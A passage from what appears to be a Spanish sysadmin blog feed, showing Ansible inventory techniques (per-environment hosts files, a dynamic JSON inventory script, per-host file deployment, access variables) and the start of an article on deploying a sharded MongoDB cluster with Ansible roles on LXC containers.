&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Variar el entorno sin cambiar los playbooks&lt;/h2&gt;
&lt;p&gt;Aunque las máquinas y las redes asignadas a cada entorno sean variables, los grupos y funcionalidades son las mismas. Suponiendo que los &lt;em&gt;playbooks&lt;/em&gt; actúen contra los grupos, variando el fichero de &lt;em&gt;hosts&lt;/em&gt; podemos conseguir todos los entornos necesarios.&lt;/p&gt;
&lt;p&gt;De hecho, podemos tener varios ficheros de &lt;em&gt;hosts&lt;/em&gt; y especificarlos por parámetro en el momento de lanzar &lt;strong&gt;ansible-playbook&lt;/strong&gt;. Por ejemplo, para el entorno de &lt;em&gt;preproducción&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts-pre
&lt;span class="o"&gt;[&lt;/span&gt;loadbalancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.2

&lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.4

&lt;span class="o"&gt;[&lt;/span&gt;dbservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.5
root@ansible:~# ansible-playbook -i hosts-pre --list-hosts setup.yml

playbook: setup.yml

  play &lt;span class="c1"&gt;#1 (loadbalancer): Setup load balancer...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.2

  play &lt;span class="c1"&gt;#2 (appservers): Setup application servers...    TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.3
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.4

  play &lt;span class="c1"&gt;#3 (dbservers): Setup database servers...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.5
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y casi lo mismo para el entono de &lt;em&gt;producción&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts-pro
&lt;span class="o"&gt;[&lt;/span&gt;loadbalancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

&lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7

&lt;span class="o"&gt;[&lt;/span&gt;dbservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.8
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.9
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.10
root@ansible:~# ansible-playbook -i hosts-pro --list-hosts setup.yml

playbook: setup.yml

  play &lt;span class="c1"&gt;#1 (loadbalancer): Setup load balancer...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

  play &lt;span class="c1"&gt;#2 (appservers): Setup application servers...    TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3

  play &lt;span class="c1"&gt;#3 (dbservers): Setup database servers...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.9
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.8
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.10
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Inventario autogenerado&lt;/h2&gt;
&lt;p&gt;A veces nos conviene sacar la lista de &lt;em&gt;hosts&lt;/em&gt; y de &lt;em&gt;grupos&lt;/em&gt; de otro lugar, por ejemplo, de una base de datos corporativa. En estos casos, basta con saber que el fichero &lt;em&gt;hosts&lt;/em&gt; puede ser ejecutable y se espera que devuelva un diccionario JSON de &lt;em&gt;grupos&lt;/em&gt;, cada uno con una lista de los &lt;em&gt;hosts&lt;/em&gt; que lo componen. &lt;strong&gt;Ansible&lt;/strong&gt; va a ejecutar el &lt;em&gt;script&lt;/em&gt; para sacar esa información.&lt;/p&gt;
&lt;p&gt;Vamos a hacer un ejercicio de imaginación: supongamos este &lt;em&gt;script&lt;/em&gt; saca los datos de algún sitio (LDAP, BBDD, una API de nuestra CMDB, ...), y los saca en formato JSON:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

import json

&lt;span class="nv"&gt;inventory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.3&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;10.0.0.4&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.5&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
&lt;span class="o"&gt;}&lt;/span&gt;

print json.dumps&lt;span class="o"&gt;(&lt;/span&gt;inventory&lt;span class="o"&gt;)&lt;/span&gt;
root@ansible:~# chmod &lt;span class="m"&gt;755&lt;/span&gt; hosts.py
root@ansible:~# ./hosts.py
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;appservers&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.3&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;10.0.0.4&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;loadbalancer&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;dbservers&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.5&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veamos que es capaz de sacar los grupos que le pidamos de forma fácil:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible -i hosts.py --list-hosts loadbalancer
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
root@ansible:~# ansible -i hosts.py --list-hosts appservers
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
root@ansible:~# ansible -i hosts.py --list-hosts dbservers
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
root@ansible:~# ansible -i hosts.py --list-hosts all
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Desplegar ficheros según el host&lt;/h2&gt;
&lt;p&gt;En los &lt;em&gt;playbooks&lt;/em&gt; podemos usar variables, bien sean de ejecución, o las que indiquemos nosotros. Esto puede jugar a nuestro favor en caso, por ejemplo, de querer desplegar ficheros distintos en cada servidor. Un ejemplo:&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos esta estructura de ficheros, con su fichero de &lt;em&gt;hosts&lt;/em&gt; y su &lt;em&gt;playbook&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# tree
.
├── hosts
├── playbook.yml
└── webs
    ├── server1
    │   ├── index.html
    │   └── sitemap.xml
    └── server2
        ├── adminer.php
        └── index.php

&lt;span class="m"&gt;3&lt;/span&gt; directories, &lt;span class="m"&gt;6&lt;/span&gt; files
root@ansible:~/multiple_webservers# cat hosts
&lt;span class="o"&gt;[&lt;/span&gt;webservers&lt;span class="o"&gt;]&lt;/span&gt;
server1
server2
root@ansible:~/multiple_webservers# cat playbook.yml
- hosts: webservers
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;webs/&lt;span class="o"&gt;{{&lt;/span&gt; inventory_hostname &lt;span class="o"&gt;}}&lt;/span&gt;/ &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/www/
root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt; para aprovisionar los ficheros &lt;em&gt;web&lt;/em&gt; a los servidores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# ansible-playbook -i hosts playbook.yml

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;server1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;server2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
server1                    : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
server2                    : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y fácilmente comprobamos que cada servidor tiene los suyos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# ssh root@server1 ls /var/www/
index.html
sitemap.xml
root@ansible:~/multiple_webservers# ssh root@server2 ls /var/www/
adminer.php
index.php
root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Variables en el inventario&lt;/h2&gt;
&lt;p&gt;Hay algunas variables que dependen de la máquina en la que se ejecutan. Aunque es posible definir estructuras condicionales en los &lt;em&gt;playbooks&lt;/em&gt;, no escala. Para no ensuciar los &lt;em&gt;playbooks&lt;/em&gt;, las podemos definir en el fichero de &lt;em&gt;hosts&lt;/em&gt;. Así pues, cada &lt;em&gt;grupo&lt;/em&gt; puede tener sus propias variables; pueden ser variables "nuestras" o variables que entienda &lt;strong&gt;ansible&lt;/strong&gt;. Como ejemplo, un &lt;em&gt;inventario&lt;/em&gt; con variables de acceso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts
[slaves]
10.0.0.2
10.0.0.3

[slaves:vars]
ansible_user = ansible
ansible_ssh_pass = s3cr3t
ansible_become = true
ansible_become_method = sudo
ansible_become_user = root
ansible_become_pass = s3cr3t
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, y de acuerdo con la &lt;a href="http://docs.ansible.com/ansible/intro_inventory.html#list-of-behavioral-inventory-parameters"&gt;documentación oficial&lt;/a&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, entraríamos con el usuario &lt;em&gt;ansible&lt;/em&gt; para hacer seguidamente &lt;strong&gt;sudo&lt;/strong&gt; para actuar con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible -i hosts -m command -a id slaves
10.0.0.3 | SUCCESS | rc=0 &amp;gt;&amp;gt;
uid=0(root) gid=0(root) grupos=0(root)

10.0.0.2 | SUCCESS | rc=0 &amp;gt;&amp;gt;
uid=0(root) gid=0(root) grupos=0(root)

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;</content><category term="ansible"></category><category term="playbook"></category></entry><entry><title>MongoDB sharding con ansible</title><link href="http://www.linuxsysadmin.ml/2016/05/mongodb-sharding-con-ansible.html" rel="alternate"></link><published>2016-05-02T00:00:00+02:00</published><updated>2016-05-02T00:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-02:/2016/05/mongodb-sharding-con-ansible.html</id><summary type="html">&lt;p&gt;Como ya vimos en un artículo anterior, los &lt;em&gt;replica sets&lt;/em&gt; nos ofrecen alta disponibilidad para nuestros despliegues de &lt;strong&gt;mongodb&lt;/strong&gt;. Sin embargo, algunas veces, necesitamos que nuestro &lt;em&gt;cluster&lt;/em&gt; ofrezca alto rendimiento, y esto se consigue mediante &lt;em&gt;sharding&lt;/em&gt;. Como no queremos renunciar a la alta disponibilidad, podemos aplicar ambas; hoy explicamos como …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya vimos en un artículo anterior, los &lt;em&gt;replica sets&lt;/em&gt; nos ofrecen alta disponibilidad para nuestros despliegues de &lt;strong&gt;mongodb&lt;/strong&gt;. Sin embargo, algunas veces, necesitamos que nuestro &lt;em&gt;cluster&lt;/em&gt; ofrezca alto rendimiento, y esto se consigue mediante &lt;em&gt;sharding&lt;/em&gt;. Como no queremos renunciar a la alta disponibilidad, podemos aplicar ambas; hoy explicamos como.&lt;/p&gt;
&lt;p&gt;El mecanismo de &lt;em&gt;sharding&lt;/em&gt; es bastante simple: tenemos nuestros datos repartidos entre uno o mas &lt;em&gt;shards&lt;/em&gt;, que se van a repartir los datos del &lt;em&gt;cluster&lt;/em&gt;. Para mantener un control de donde están los datos, también vamos a necesitar unos procesos especiales llamados &lt;em&gt;config servers&lt;/em&gt;. Finalmente, habrá que poner algunos procesos &lt;em&gt;mongos&lt;/em&gt; que son unos &lt;em&gt;proxies&lt;/em&gt; al &lt;em&gt;cluster&lt;/em&gt; y sirven para ocultar la complejidad del mismo.&lt;/p&gt;
&lt;h2&gt;Visión del conjunto&lt;/h2&gt;
&lt;p&gt;Hay que decir que el mecanismo de &lt;em&gt;sharding&lt;/em&gt; permite poner y quitar &lt;em&gt;shards&lt;/em&gt; a &lt;em&gt;posteriori&lt;/em&gt;, igual que con los procesos &lt;em&gt;mongos&lt;/em&gt;, pero para empezar vamos a necesitar una arquitectura inicial que es lo que vamos a montar.&lt;/p&gt;
&lt;p&gt;Para empezar se ha decidido por un &lt;em&gt;cluster&lt;/em&gt; de 3 &lt;em&gt;shards&lt;/em&gt;, siendo cada uno de ellos un &lt;em&gt;replica set&lt;/em&gt; de dos nodos de datos y un árbitro cada uno. Usaremos la cantidad de &lt;em&gt;config servers&lt;/em&gt; que se recomienda en la documentación oficial.&lt;/p&gt;
&lt;p&gt;Así pues, y tras elegir nombres para los &lt;em&gt;shards&lt;/em&gt;, podemos pintar un esquema de nuestro &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Arquitectura lógica" src="http://www.linuxsysadmin.ml/images/sharding_arquitectura_logica.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Para repartir los procesos entre las máquinas, hay dos reglas que hay que respetar a rajatabla:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Los procesos de datos necesitan una máquina propia, para que no se disputen los recursos de disco y memoria.&lt;/li&gt;
&lt;li&gt;No hay que poner nunca dos o mas procesos de cada &lt;em&gt;shard&lt;/em&gt;, ya que la no disponibilidad de la máquina supondría la pérdida de la mayoría de las &lt;em&gt;replica sets&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El resto de procesos pueden compartir servidor con los de datos. Hay muchas formas de cumplir con las dos reglas, por ejemplo, la que vamos a montar:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Arquitectura física" src="http://www.linuxsysadmin.ml/images/sharding_arquitectura_fisica.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Ansible al rescate&lt;/h2&gt;
&lt;p&gt;Debido a la gran cantidad de procesos que hay que levantar, se ha decidido por automatizar su despliegue mediante &lt;strong&gt;ansible&lt;/strong&gt;. El proceso es bastante similar a &lt;a href="http://www.linuxsysadmin.ml/2015/12/construyendo-una-replica-set-en-mongodb.html"&gt;otro de nuestros artículos&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Se ha utilizado el mecanismo de &lt;strong&gt;roles&lt;/strong&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, para poder desplegar todos los procesos del mismo tipo; el detalle es que se han usado los parámetros en los &lt;strong&gt;roles&lt;/strong&gt; para los cambios menores. Si queréis intentarlo o entender como funcionan los despliegues, podéis encontrar los &lt;strong&gt;playbooks&lt;/strong&gt; &lt;a href="http://www.linuxsysadmin.ml/downloads/sharding_playbooks.tar.gz"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;El fichero comprimido no incluye los binarios de &lt;strong&gt;mongodb&lt;/strong&gt; para reducir tamaño, así que hay que añadirlos en las respectivas carpetas &lt;em&gt;files&lt;/em&gt;. Tras descomprimir el fichero &lt;em&gt;.tar.gz&lt;/em&gt; y poner los binarios ausentes, nos debería quedar algo como esto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# tree
.
├── aquila_shard.yaml
├── clients.yaml
├── config_servers.yaml
├── cygnus_shard.yaml
├── hosts.yaml
├── lyra_shard.yaml
├── mongos_servers.yaml
└── roles
    ├── client
    │   ├── files
    │   │   └── mongo
    │   └── tasks
    │       └── main.yaml
    ├── config
    │   ├── meta
    │   │   └── main.yaml
    │   ├── tasks
    │   │   └── main.yaml
    │   └── templates
    │       ├── config.conf
    │       └── config.service
    ├── mongod
    │   ├── files
    │   │   └── mongod
    │   └── tasks
    │       └── main.yaml
    ├── mongos
    │   ├── files
    │   │   └── mongos
    │   ├── tasks
    │   │   └── main.yaml
    │   └── templates
    │       ├── mongos.conf
    │       └── mongos.service
    └── shard
        ├── meta
        │   └── main.yaml
        ├── tasks
        │   └── main.yaml
        └── templates
            ├── shard.conf
            └── shard.service

&lt;span class="m"&gt;19&lt;/span&gt; directories, &lt;span class="m"&gt;23&lt;/span&gt; files
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparación de las máquinas&lt;/h2&gt;
&lt;p&gt;De acuerdo con la arquitectura propuesta, vamos a necesitar 6 servidores para el &lt;em&gt;cluster&lt;/em&gt;, que vamos a montar como contenedores LXC y, aunque no es lo ideal, nos vale como demostración. En la séptima máquina es donde tenemos las herramientas de configuración, en este caso, &lt;strong&gt;ansible&lt;/strong&gt; y los &lt;strong&gt;playbooks&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4        IPV6  AUTOSTART
---------------------------------------------
ansible  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.254  -     NO
mongo01  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2    -     NO
mongo02  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3    -     NO
mongo03  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4    -     NO
mongo04  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5    -     NO
mongo05  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6    -     NO
mongo06  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7    -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a declarar todas las máquina usadas en el fichero &lt;em&gt;hosts&lt;/em&gt; de &lt;strong&gt;ansible&lt;/strong&gt;. Ya de paso, los vamos a catalogar en grupos, para que los &lt;strong&gt;playbooks&lt;/strong&gt; se puedan lanzar a los grupos, indistintamente de los servidores que los formen.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat ansible/etc/hosts
&lt;span class="o"&gt;[&lt;/span&gt;mongo_servers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7

&lt;span class="o"&gt;[&lt;/span&gt;config_servers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4

&lt;span class="o"&gt;[&lt;/span&gt;aquila_shard_data&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5

&lt;span class="o"&gt;[&lt;/span&gt;aquila_shard_arbiters&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6

&lt;span class="o"&gt;[&lt;/span&gt;lyra_shard_data&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6

&lt;span class="o"&gt;[&lt;/span&gt;lyra_shard_arbiters&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7

&lt;span class="o"&gt;[&lt;/span&gt;cygnus_shard_data&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7

&lt;span class="o"&gt;[&lt;/span&gt;cygnus_shard_arbiters&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5

&lt;span class="o"&gt;[&lt;/span&gt;mongos_servers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

&lt;span class="o"&gt;[&lt;/span&gt;clients&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por comodidad, vamos a referirnos a las máquinas por su nombre, y a falta de un servidor DNS adecuado, vamos a rellenar sus ficheros &lt;em&gt;/etc/hosts&lt;/em&gt;; para ello vamos a usar un &lt;strong&gt;playbook&lt;/strong&gt; que se asegure que esas líneas están en el fichero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook hosts.yaml

...

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
